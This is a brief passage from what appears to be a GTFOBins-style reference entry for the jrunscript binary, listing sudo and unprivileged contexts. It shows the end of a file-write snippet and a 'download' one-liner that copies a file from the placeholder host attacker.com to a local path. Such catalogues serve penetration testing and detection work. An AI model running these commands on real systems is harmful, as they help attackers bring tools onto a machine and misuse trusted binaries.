        fw.write("DATA");
        fw.close();'
    ```
    _contexts: sudo, unprivileged_

    ### download
    ```
    jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
    ```
    _contexts: sudo, unprivileged_
